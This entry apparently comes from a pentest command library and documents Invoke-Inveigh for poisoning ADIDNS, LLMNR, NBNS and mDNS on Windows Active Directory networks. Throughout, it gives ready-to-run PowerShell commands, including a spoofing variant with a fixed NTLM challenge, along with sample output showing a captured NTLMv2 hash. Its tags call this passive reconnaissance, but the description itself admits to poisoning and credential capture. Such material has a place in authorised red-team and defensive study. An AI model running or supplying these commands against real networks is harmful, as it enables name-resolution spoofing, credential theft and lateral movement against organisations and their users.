---
id: 20f69a31-43b5-4883-b81b-97a3b6021a68
name: invoke-inveigh-adidns-recon
type: command
executor: powershell
data: >-
  Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
  -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
output: null
created_at: '2023-04-06T03:56:06.634897Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - dns-spoofing
  - passive-recon
  - active-directory
verified: true
validated: true
---

# invoke-inveigh-adidns-recon

## Command

```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS $_RECORD_TYPES -ADIDNSThreshold $_THRESHOLD -LLMNR Y -NBNS Y -mDNS Y -Challenge $_CHALLENGE -MachineAccounts Y
```

## Description

This PowerShell command invokes the Inveigh module for passive reconnaissance and potential spoofing using Active Directory Integrated DNS data. It listens on multiple name resolution protocols and targets specific ADIDNS record types for poisoning attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ConsoleOutput Y | Enable console output for real-time logging | Yes |
| -ADIDNS $_RECORD_TYPES | ADIDNS record types to target (e.g., 'combo,ns,wildcard') | Yes |
| -ADIDNSThreshold $_THRESHOLD | Minimum matches before displaying a record (e.g., 3) | Yes |
| -LLMNR Y | Enable LLMNR poisoning listening | Yes |
| -NBNS Y | Enable NBNS (NetBIOS) poisoning | Yes |
| -mDNS Y | Enable mDNS poisoning | Yes |
| -Challenge $_CHALLENGE | Custom NTLMv2 challenge value (e.g., 1122334455667788) | No |
| -MachineAccounts Y | Use machine accounts for authentication | Yes |

## Examples

### Basic Usage

```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y
```

### Advanced Usage

```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS wildcard -ADIDNSThreshold 5 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y -Spoof
```

## Expected Output

```
[*] Inveigh started
[+] Listening on LLMNR/NBNS/mDNS
[+] ADIDNS wildcard match for 'targethost' (threshold met)
[hash] DOMAIN::USER:1122334455667788:challenge::hash
[*] Captured NTLMv2 hash
```

Displays protocol activity, record matches, and captured authentication data.

## Related

- [[procedures/Active-Directory-Integrated-DNS-Enumeration]]
- [[tools/Inveigh]]
